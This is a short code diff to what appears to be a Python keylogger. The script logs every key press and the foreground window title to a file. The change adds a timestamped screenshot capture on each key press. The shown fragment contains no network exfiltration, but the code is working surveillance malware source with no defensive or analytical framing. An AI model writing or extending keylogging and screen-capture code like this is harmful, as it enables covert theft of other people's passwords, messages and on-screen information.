@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, KeyCode, Listener
 from win32gui import GetWindowText, GetForegroundWindow
-import os, readline
+import os, readline, pyautogui, time
 
 #try:
 #except typeErr:
@@ -17,7 +17,10 @@ def on_press(key):
            mon_fichier.write('\n')
            mon_fichier.write(GetWindowText(GetForegroundWindow()))
            mon_fichier.write(' : ')
-    
+
+    nameFile = str(time.time())
+    nameFile += '.png'
+    pyautogui.screenshot(nameFile)
     print('key :',key)
     if(key == Key.space):
         mon_fichier.write(' ')
